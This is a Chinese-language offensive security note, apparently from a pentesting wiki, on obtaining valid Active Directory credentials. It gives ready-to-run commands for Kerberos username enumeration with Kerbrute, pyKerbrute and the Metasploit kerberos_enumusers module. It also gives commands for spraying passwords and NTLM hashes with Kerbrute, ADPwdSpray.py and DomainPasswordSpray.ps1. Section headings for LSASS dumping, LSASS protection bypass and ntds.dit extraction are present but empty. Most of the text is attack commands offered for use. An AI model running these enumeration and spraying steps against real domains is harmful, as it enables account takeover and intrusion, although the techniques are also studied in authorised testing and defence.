---
description: 基于Kerberos认证 / 枚举用户名 + 密码喷洒 = 获取有效凭证 / 枚举出用户名
---

# ✔️ 获取域内有效凭证

## 攻击手法

1. 枚举出目标域内存在的用户名
2. 对这些用户名进行密码喷洒
3. 获得有效域内用户凭证：
   1. 明文身份凭证
   2. Hash身份凭证

## 获取明文身份凭证

### LAS Secrets





### LSASS Process





### LSASS Protection bypass







### Credential Manager





## 获取Hash身份凭证

### 通过SAM数据库获取本地用户Hash凭证





### 通过域控的ntds.dit文件

#### 本地提取







#### 远程提取





## 用户名枚举工具&使用

### Kerbrute

* `userenum`：指定操作为用户名枚举
* `usernames.txt`：包含待枚举用户名的文件（可以是字典，也可以是针对目标域收集到的用户名列表）

```bash
kerbrute userenum -d 目标域名 usernames.txt -dc-ip 域控IP
```

### pyKerbrute

* 和Kerbrute类似（该工具用python写的）
* 用的是：EnumADUser.py

```bash
// TCP模式
python EnumADUser.py 域控IP 目标域名 username.txt tcp
// UDP模式
python EnumADUser.py 域控IP 目标域名 username.txt udp
```

### MSF

* 模块：auxiliary/gather/kerberos\_enumusers

```bash
use auxiliary/gather/kerberos_enumusers
set domain 目标域名
set RHOSTS 域控IP
set user_file /tem/username.txt
run
```

## 密码喷洒工具&使用

### Kerbrute

* `passwordspray`：指定操作为密码喷洒

```bash
kerbrute passwordspray -d 目标域名 -p 已知的密码 usernames.txt -dc-ip 域控IP
```

### pyKerbrute

* 用的是：ADPwdSpray.py

```bash
// 针对明文密码进行喷洒（TCP和UDP模式）
python ADPwdSpray.py 域控IP 目标域名 username.txt clearpassword 已知明文密码 tcp
python ADPwdSpray.py 域控IP 目标域名 username.txt clearpassword 已知明文密码 udp
// 针对密码Hash进行喷洒（TCP和UDP模式）
python ADPwdSpray.py 域控IP 目标域名 username.txt ntlmhash 已获取的密码哈希 tcp
python ADPwdSpray.py 域控IP 目标域名 username.txt ntlmhash 已获取的密码哈希 udp
```

### DomainPasswordSpray.ps1

* 该工具为powershell脚本
* 需要在目标域内机器上执行
* 原理：利用LDAP从域中导出列表->去除被锁定的用户->进行密码喷洒

```powershell
Import-Module.\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 已知的明文密码
```



